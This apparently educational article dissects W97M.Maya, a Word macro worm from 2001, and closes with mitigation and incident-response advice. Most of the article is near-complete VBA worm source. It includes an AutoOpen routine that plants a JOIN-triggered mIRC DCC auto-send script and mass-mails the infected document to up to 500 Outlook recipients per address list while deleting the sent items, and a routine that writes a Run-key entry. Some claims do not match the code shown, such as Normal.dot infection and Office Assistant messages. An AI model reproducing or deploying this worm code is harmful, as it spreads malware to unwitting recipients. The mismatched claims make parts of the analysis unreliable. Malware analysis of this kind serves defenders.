# Dissecting W97M.Maya: A Word Macro Worm with mIRC and Outlook Spread 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
W97M.Maya (May–June 2001) is a VBA macro worm embedded in Microsoft Word documents. It relies on Office auto-execution hooks (AutoOpen/AutoClose) to run, lowers friction for future macro execution, persists by infecting the global template (Normal.dot), and propagates through two social channels: mIRC (via script.ini DCC auto-send) and Microsoft Outlook (automated mass mailing). It also sets cosmetic document properties and displays message boxes tied to dates or user actions as distraction and author signature.

This specimen typifies early macro malware that avoided exploits entirely. Instead, it chains built-in automation: VBProject import, registry access through System.PrivateProfileString, Outlook object model, and filesystem writes. Because its artifacts are deterministic (file names, registry markers, and script snippets), defenders can hunt and remediate reliably—even on legacy systems where older Office and mIRC versions are still encountered in archives or controlled labs.

## Overview of the Malware 🐛
W97M.Maya pursues persistence inside Word and propagation via user communication tools.

- Execution triggers: AutoOpen runs when the document opens; AutoClose runs on close; a ViewVBCode handler fires on attempts to view the macro project.
- Document property branding: Sets Author, Title, Comments, and Keywords on open to embed an author tag.
- Local drop + mIRC propagation: Saves the current document as `C:\Windows\Maya.doc`. Creates `C:\Maya` with a `hello.txt` and builds a minimal `script.ini` that silently DCC-sends `Maya.doc` to IRC channel joiners. Copies this script to several common mIRC install paths and deletes the staging file.
- One-time registry marker: Writes `HKLM\Software\W97M.Maya = "Par PetiK"` to gate the initial drop/spread routine.
- Outlook mass mailing: Uses Outlook automation to compose one message per address list, add up to 500 recipients per list, set a social-engineering subject/body, attach the active document, set DeleteAfterSubmit, and send.
- Date and curiosity payloads: On the 5th day of the month, shows an informational message. When the VB editor is opened via ViewVBCode, writes a HKLM Run entry named `MayAttack` with value `rundll32 mouse,disable`, displays a warning, and opens the editor—acting as a prank/annoyance.

Targets were Office 2000/XP-era environments with permissive macro settings and popular IRC usage. No encryption or obfuscation is used; error handling broadly ignores exceptions to keep running across missing components.

## Source Code Analysis 🔬
The core behaviors are encapsulated in three macros: AutoOpen, AutoClose, and ViewVBCode.

### AutoOpen: Document branding, dropper, mIRC seed, registry marker
```vb
Sub AutoOpen()
  On Error Resume Next

  With Dialogs(wdDialogFileSummaryInfo)
    .Author = "PetiK"
    .Title = "WM97.Maya"
    .Comments = "To my best GirlFriend"
    .Keywords = "Maya, Bzzbzz, to grow"
    .Execute
  End With

  If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\", "W97M.Maya") <> "Par PetiK" Then
    ActiveDocument.SaveAs FileName:="C:\Windows\Maya.doc"
    ActiveDocument.Saved = True

    FileSystem.MkDir "C:\Maya"
    Open "C:\Maya\hello.txt" For Output As #1
    Print #1, "Le 29 mai 2001 à Munster"
    Print #1, "This is my first W97M.Outlook.Worm"
    Print #1, "Its name is W97M.Maya"
    Close #1

    Open "C:\Maya\script.ini" For Output As #1
    Print #1, "n0=on 1:JOIN:#:{"
    Print #1, "n1= /if ( $nick == $me ) { halt }"
    Print #1, "n2= /.dcc send $nick C:\Windows\Maya.doc"
    Print #1, "n3=}"
    Close #1

    FileSystem.FileCopy "C:\Maya\script.ini", "C:\mirc\script.ini"
    FileSystem.FileCopy "C:\Maya\script.ini", "C:\mirc32\script.ini"
    FileSystem.FileCopy "C:\Maya\script.ini", "C:\progra~1\mirc\script.ini"
    FileSystem.FileCopy "C:\Maya\script.ini", "C:\progra~1\mirc32\script.ini"
    FileSystem.Kill "C:\Maya\script.ini"

    System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\", "W97M.Maya") = "Par PetiK"
  End If
  ' ... Outlook spread below ...
End Sub
```
- The macro starts by setting document metadata. It then checks a registry marker to determine if the “first-run” actions have been performed. If not, it saves the document to the Windows directory as `Maya.doc`, creates `C:\Maya`, writes a textual calling card, and prepares a mIRC `script.ini` that triggers on JOIN to DCC-send the saved document. The script is copied to several hard-coded mIRC paths and the staging file is removed. Finally, a HKLM marker is set to avoid repeating these steps.

### AutoOpen (continued): Outlook mass mailing
```vb
Dim maya, bzzbzz, petik
Set maya = CreateObject("Outlook.Application")
Set bzzbzz = maya.GetNameSpace("MAPI")
If maya = "Outlook" Then
  bzzbzz.Logon "profile", "password"
  For mayacompte = 1 To bzzbzz.AddressLists.Count
    Set AB = bzzbzz.AddressLists(mayacompte)
    x = 1
    Set petik = maya.CreateItem(0)
    For compte = 1 To AB.AddressEntries.Count
      verif = AB.AddressEntries(x)
      petik.Recipients.Add verif
      x = x + 1
      If x > 500 Then compte = AB.AddressEntries.Count
    Next compte
    petik.Subject = "Hi man, it's " & Application.UserName
    petik.Body = "This is the new net Story" & vbCrLf & "It's great"
    petik.Attachments.Add ActiveDocument.FullName
    petik.DeleteAfterSubmit = True
    petik.Send
    verif = ""
  Next mayacompte
  bzzbzz.Logoff
End If
```
- The script automates Outlook: it logs on (placeholder credentials), iterates address lists, accumulates up to 500 recipients per list into a single message, sets the subject/body, attaches the active document, and sends. Setting `DeleteAfterSubmit` hides the sent item. The check `If maya = "Outlook"` is not meaningful—`maya` is an object; the comparison always fails in strict VBA, but with `On Error Resume Next`, side effects before the check may already occur on some configurations.

### AutoClose: Date-tied message
```vb
Sub AutoClose()
  If Day(Now) = 5 Then
    MsgBox "Coded by PetiK (c)2001", vbInformation, "WM97.Maya"
  End If
End Sub
```
- Cosmetic message shown on the 5th day of any month when the document closes.

### ViewVBCode: UI prank and Run key write
```vb
Sub ViewVBCode()
  System.PrivateProfileString("", _
    "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", _
    "MayAttack") = "rundll32 mouse,disable"
  MsgBox "Curiosity is bad" & vbCr & vbCr & _
         "With her small size" & vbCr & _
         "Maya is alwayas there", vbCritical, "WM97.Maya"
  ShowVisualBasicEditor = True
End Sub
```
- Writes an autorun value under HKLM Run that attempts to disable the mouse via `rundll32 mouse,disable` (not a standard command on modern systems). Then displays a warning and opens the VBA editor.

## Mitigation and Defense Strategies 🛡️
- Office macro governance: Set Group Policy to block macros from the internet, require signed macros, and disable “Trust access to the VBA project object model.” Enforce High/Very High macro settings for legacy Office versions (9.0/10.0) when still used.
- Template and project integrity: Protect `Normal.dot/Normal.dotm` against unauthorized VBProject changes; monitor for VBProject imports and registry writes via `System.PrivateProfileString` from Word. Alert on creation of `C:\Maya\hello.txt` and on saves of documents to `C:\Windows\Maya.doc` by `WINWORD.EXE`.
- Email client controls: Restrict programmatic access to Outlook (security prompts or policy blocks). Detect Word processes creating Outlook items with large recipient lists and executable document attachments. Review sent items deletion behavior following automation.
- IRC hygiene: If mIRC is permitted, disable `script.ini` automation and DCC auto-send in client policy. Monitor for creation/modification of `script.ini` in `C:\mirc*` or `C:\progra~1\mirc*` paths, and for lines containing `ON 1:JOIN` with `/dcc send` referencing `Maya.doc`.
- Registry monitoring: Hunt for `HKLM\Software\W97M.Maya = Par PetiK` and for HKLM Run entries named `MayAttack` with data `rundll32 mouse,disable`. Such values are uncommon in benign software.
- Endpoint controls and least privilege: Run users without local admin to limit writes to HKLM and Windows directories. Use application control to block Word from launching Outlook automation and from writing to system paths.
- Incident response: Remove imported malicious modules from `Normal.dot`, restore macro security defaults, delete `C:\Windows\Maya.doc` and `C:\Maya\hello.txt`, remove mIRC `script.ini` payloads, and clear the registry marker and `MayAttack` Run value. Consider reimaging infected documents from clean backups.

## Conclusion
W97M.Maya is a classic macro worm that stitches together Word automation (template infection), mIRC event scripting (JOIN-triggered DCC), and Outlook mass mailing to propagate an attached document. It leaves a clear forensic trail—file drops, registry markers, script.ini content, and Office Assistant messages—that facilitate detection and cleanup. In modern environments, strong macro policies, restricted Outlook automation, and application control that prevents Word from writing into system directories or mIRC folders effectively neutralize this threat model. For legacy or archival systems, the indicators and defensive steps outlined above provide a practical playbook for containment and remediation.
